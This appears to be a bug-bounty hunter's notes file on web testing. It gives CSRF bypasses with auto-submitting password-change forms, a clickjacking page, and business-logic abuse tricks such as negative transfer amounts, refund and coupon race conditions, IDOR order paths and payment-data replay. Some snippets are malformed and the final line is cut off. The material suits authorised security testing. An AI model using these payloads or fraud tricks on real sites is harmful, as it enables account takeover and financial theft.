---
tags:
  - web_hunting
---
- **CSRF Bypasses**
    
    - **ClickJacking**
        
        ```html
        <html>
         <head>
         <title>Clickjack test page</title>
         </head>
         <body>
         <p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
         <iframe src="PAGE_URL" width="500" height="500"></iframe>
         </body>
        </html>
        ```
        
    - **Change Request Method**
        
        ```html
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE
        (POST request body)
        new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
        --------------------------------------------
        GET /password_change?new_password=abc123
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE
        ```
        
    - **Bypass CSRF Tokens stored on the server**
        
        ```html
        # remove the token
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE
        (POST request body)
        new_password=abc123
        -------------------------------------------------------------
        <html>
         <form method="POST" action="<https://email.example.com/password_change>" id="csrf-form">
         <input type="text" name="new_password" value="abc123">
         <input type='submit' value="Submit">
         </form>
         <script>document.getElementById("csrf-form").submit();</script>
        </html>
        ----------------------------------------------------------------
        # Empty Parameter
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE
        (POST request body)
        new_password=abc123&csrf_token=
        ---------------------------------------------------------------------
        <html>
         <form method="POST" action="<https://email.example.com/password_change>" id"csrf-form">
         <input type="text" name="new_password" value="abc123">
         <input type="text" name="csrf_token" value="">
         <input type='submit' value="Submit">
        </form>
         <script>document.getElementById("csrf-form").submit();</script>
        </html>
        --------------------------
        # Expected Code
        def validate_token():
         if (request.csrf_token == session.csrf_token):
        		 pass
         else:
        	 throw_error("CSRF token incorrect. Request rejected.")
        [...]
        def process_state_changing_action():
        	 if request.csrf_token:
        		 validate_token()
        		 execute_action()
        ```
        
    - **Weak Token Integriti ( Reuse token )**
        
        ```html
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE
        (POST request body)
        new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
        ----------------------------------
        <html>
         <form method="POST" action="<https://email.example.com/password_change>" id"csrf-form">
         <input type="text" name="new_password" value="abc123">
         <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b ">
         <input type='submit' value="Submit">
        </form>
         <script>document.getElementById("csrf-form").submit();</script>
        </html>
        --------------------------------------------------------------
        ## Expected Code
        def validate_token():
         if request.csrf_token:
        	 if (request.csrf_token in valid_csrf_tokens):
        			 pass
        	 else:
        		 throw_error("CSRF token incorrect. Request rejected.")
        [...]
        def process_state_changing_action():
        	 validate_token()
        	 execute_action()
        ```
        
    - **Bypass Double submit CSRF tokens**
        
        ```python
        # Valid 
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b
        (POST request body)
        new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
        --------------------------
        # Invalid
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=1aceb9aad8b65b871caef0757a4ac969
        (POST request body)
        new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
        ---------------------------------------
        # Bypass 
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
        (POST request body)
        new_password=abc123&csrf_token=not_a_real_token
        ```
        
    - **Bypass CSRF Referer Header Check**
        
        ```python
        # Just Remove The referrer
        <html>
         <meta name="referrer" content="no-referrer">
         <form method="POST" action="<https://email.example.com/password_change>" id="csrf-form">
         <input type="text" name="new_password" value="abc123">
         <input type='submit' value="Submit">
         </form>
         <script>document.getElementById("csrf-form").submit();</script>
        </html>
        --------------------
        # Expected Code
        def validate_referer():
         if (request.referer in allowlisted_domains):
        pass
         else:
         throw_error("Referer incorrect. Request rejected.")
        [...]
        def process_state_changing_action():
         if request.referer:
         validate_referer()
         execute_action()
        ---------------------------
        # another way
        POST /password_change
        Host: email.example.com
        Cookie: session_cookie=YOUR_SESSION_COOKIE;
        Referer: example.com.attacker.com
        (POST request body)
        new_password=abc123
        ------------------
        # Vulnerable code
        def validate_referer():
         if request.referer:
         if ("example.com" in request.referer):
         pass
         else:
         throw_error("Referer incorrect. Request rejected.")
        [...]
        def process_state_changing_action():
         validate_referer()
         execute_action()
        ```
        
    - **Bypass CSRF Protection by Using XSS**
        
        Steal victim CSRF Token Via XSS Vulnerability

- **Premium Feature Abuse**
	1. Try **forcefully browsing** the areas or some particular endpoints which come under premium accounts
	2. **Pay for a premium feature** and cancel your subscription. If you get a **refund** but the feature is still **usable**, it’s a monetary impact issue.
	3. Some applications use **true-false request/response values** to validate if a user is having access to premium features or not.
	4. Try using **Burp’s Match & Replace to see if you** can replace these values whenever you browse the app & access the premium features.
	5. Always check **cookies or local storage** to see if any variable is checking if the user should have access to premium features or not.

- **Refund Feature Abuse**
	- Purchase a product (usually some subscription) and ask for a refund to see if the feature is still accessible.
	- Try for currency arbitrage
	- Try making multiple requests for subscription cancellation (race conditions) to see if you can get multiple refunds.
- **Cart/Wishlist Abuse**
	- - Add a product in **negative quantity** with other products in positive quantity to balance the amount.
	- Add a product in more than the available quantity.
	- Try to see when you add a product to your Wishlist and move it to a cart if it is possible to move it to some other user’s cart or delete it from there.
- IDOR in order Page
    
    ```python
    <https://example.com/account/orders/12345>
    GET /account.php?history=y&orderno=10425128 HTTP/2
    <https://example.com/pdf/><orderno>.pdf.
    <https://example.com/pdf/10425128.pdf>
    ```
- Leaking Credit Card Details in Responses
    
    ```python
    I was testing a CRM (Customer Relationship Management)
    application, in which help desk representatives were only able to view basic customer
    details: their first and last names, their location, and the last 4 digits of their credit
    card number. But when I inspected the response, I found that the developers returned
    extra information that was not visible in the application view:
    
    HTTP/1.1 200 OK
    Host: vulnlab.com
    {“first_name”: “Harry”, “last_name”: “Potter”, “isAdmin”: false, “location”:
    “London”, “last_bill_cycle”: “110219”, “mask_cc”: “******4510”, “exp_-
    date”: “08/23”, “cvv”: “123”, “full_card”: “6011111111114510”}
    ```
- Bypass Transfer Money Limit
    
    ```python
    [] use negative number to exceed money transfer limit 
    private function CheckDayLimit($amount)
    {
    if($amount > 3000){
    return false;
    }
    return true;
    }
    ------------------------------------
    So, this could be overcome by using a simple negative number. In the end, I bypassed
    this business logic by the following request:
    --------------------------------------
    PUT /v1/api/transfer-money HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    {‘csrf_token’: ‘RWFzdGVyIGVnZyEgWW91RhdGEg=’,’amount’: ‘-4500’, ‘currency’: ‘USD’, ‘customer_account’: ‘012-90829-012’}
    And the response was:
    HTTP/1.1 200 OK
    Host: vulnlab.com
    -------------------------------
    Why did this happen? It seems that in the rest of the application logic, negative
    numbers in the amount parameter were generated as positive numbers. However,
    the negative value could override the “greater than” logic, letting us process the
    transaction and bypass the business requirement.
    ```
- Borrow Money Without Return
    
    ```python
    [] Change the loan return date to --> 31/February
    --------------
    Example 
    PUT /v1/api/customer/loan HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    {‘csrf_token’: ‘RWFzdGVyIGVnZyEgWW91RhdGEg=’, ‘loadId’: ‘PID6459’,
    ‘first_payment’: ‘11032015’}
    ----------------------
    PUT /v1/api/customer/loan HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    {‘csrf_token’: ‘RWFzdGVyIGVnZyEgWW91RhdGEg=’, ‘loadId’: ‘PID6459’,
    ‘first_payment’: ‘31022015’}
    -----------------------------------
    Explain: 
    Obviously, there are only 28 days in February (and 29 days in a leap year). Hence, in
    the above case, it means that we can receive the loan, while the return payment date
    would never arrive.
    ```
- Get Better Yearly Rates
    
    ```python
    In this scenario, a driver insurance service provided a better rate for customers who
    drove less. When filling in a form on the insurer’s website, the user provided an
    estimate of how many kilometers they drove on average, and how many years of
    driving experience they had. Then, the application calculated the yearly rate based
    on this data, and sent the following request prior to the signing part:
    ----------------------------------------------------------------
    POST /prepare_offer HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    		{‘customer_name’: ‘John Doe’, ‘yearly_rate’: ‘3644’, ‘is_young’: false}
    -----------------------------
    By simply changing the yearly_rate parameter to another rate, it was possible to pay
    less for the same service and get it as signed offer
    ```
- **Gifts Feature**
    - Apply the **same code** more than once to see if the coupon code is reusable.
    - If the coupon code is uniquely usable, try testing for **Race Condition** on this function by using the same code for two accounts at a parallel time.
    - Try Mass Assignment or **HTTP Parameter Pollution** to see if you can add multiple coupon codes while the application only accepts one code from the Client Side.
    - Try performing attacks that are caused by missing input sanitization such as **XSS, SQLi**, etc. on this field
    - Try adding discount codes on the products which **are not covered under discounted** items by tampering with the request on the server-side.
    - **[Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247)**
- Discount Checkout Flaws
    
    ```python
    [] input the gift code and intercept the reques and remove it from the request
    [] Manipulate the response when reuse the discount code 
    [] Discount is for multiiple Items ? collect items and intercept the request change it to one item
    [] No Rate Limit --> https://hackerone.com/reports/123091
    [] Race Condition--> https://hackerone.com/reports/157996
    [] Sql injection
    ```
- Buy Products at lower price
    
    ```python
    • Add cheap items to the cart. During the payment process, capture the encrypted payment data being sent to the payment gateway.
    • Initiate another shopping process and add expensive/multiple items to the cart. Replace the payment data with the previously captured data.
    • If the application does not cross-validate the data, we’ll be able to buy products at a lower price
    ```
- **IDOR** in Change Price 
	1. make a request to buy anything
	2. try changing the price in request/response
- **Currency Arbitrage**
	- Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might be possible to gain more amount.
	- change USD to any poor 
 